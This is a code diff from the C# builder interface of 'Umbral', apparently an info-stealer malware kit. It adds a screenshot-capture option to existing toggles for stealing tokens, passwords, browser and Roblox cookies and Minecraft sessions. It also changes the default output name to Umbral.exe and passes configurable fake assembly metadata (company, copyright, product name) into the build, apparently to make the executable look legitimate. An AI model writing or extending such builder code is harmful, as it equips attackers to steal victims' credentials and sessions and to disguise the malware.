@@ -26,7 +26,7 @@ namespace Umbral.builder.User_Controls
             if (buildButton.Text.Equals(BuildButtonEnabledPlaceHolder))
             {
                 if (!(GeneralTab.StealTokens || GeneralTab.StealRobloxCookies || GeneralTab.StealCookies ||
-                      GeneralTab.StealPasswords || GeneralTab.StealMinecraftSession))
+                      GeneralTab.StealPasswords || GeneralTab.StealMinecraftSession || GeneralTab.TakeScreenshot))
                 {
                     MessageBox.Show("Enable at least one of the stealing targets!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                     return;
@@ -39,7 +39,7 @@ namespace Umbral.builder.User_Controls
                     {
                         AddExtension = true,
                         CheckPathExists = true,
-                        FileName = "output.exe",
+                        FileName = "Umbral.exe",
                         Filter = "Executable File|*.exe"
                     };
 
@@ -60,21 +60,22 @@ namespace Umbral.builder.User_Controls
                         StealPasswords = GeneralTab.StealPasswords,
                         StealCookies = GeneralTab.StealCookies,
                         StealRobloxCookies = GeneralTab.StealRobloxCookies,
-                        StealMinecraftSession = GeneralTab.StealMinecraftSession
-                    };
+                        StealMinecraftSession = GeneralTab.StealMinecraftSession,
+                        CaptureScreenshot = GeneralTab.TakeScreenshot,
 
-                    builder.AssemblyInformation = new AssemblyInfo
-                    {
-                        CompanyName = AssemblyTab.CompanyNameInfo,
-                        AssemblyVersion = AssemblyTab.AssemblyVersionInfo,
-                        FileDescription = AssemblyTab.FileDescriptionInfo,
-                        FileVersion = AssemblyTab.FileVersionInfo,
-                        InternalName = AssemblyTab.InternalNameInfo,
-                        LegalCopyright = AssemblyTab.LegalCopyrightInfo,
-                        LegalTrademarks = AssemblyTab.LegalTrademarksInfo,
-                        OriginalFilename = AssemblyTab.OriginalFilenameInfo,
-                        ProductName = AssemblyTab.ProductNameInfo,
-                        ProductVersion = AssemblyTab.ProductVersionInfo
+                        AssemblyInformation = new AssemblyInfo
+                        {
+                            CompanyName = AssemblyTab.CompanyNameInfo,
+                            AssemblyVersion = AssemblyTab.AssemblyVersionInfo,
+                            FileDescription = AssemblyTab.FileDescriptionInfo,
+                            FileVersion = AssemblyTab.FileVersionInfo,
+                            InternalName = AssemblyTab.InternalNameInfo,
+                            LegalCopyright = AssemblyTab.LegalCopyrightInfo,
+                            LegalTrademarks = AssemblyTab.LegalTrademarksInfo,
+                            OriginalFilename = AssemblyTab.OriginalFilenameInfo,
+                            ProductName = AssemblyTab.ProductNameInfo,
+                            ProductVersion = AssemblyTab.ProductVersionInfo
+                        }
                     };
 
                     BuildButton.Text = BuildButtonEnabledPlaceHolder;
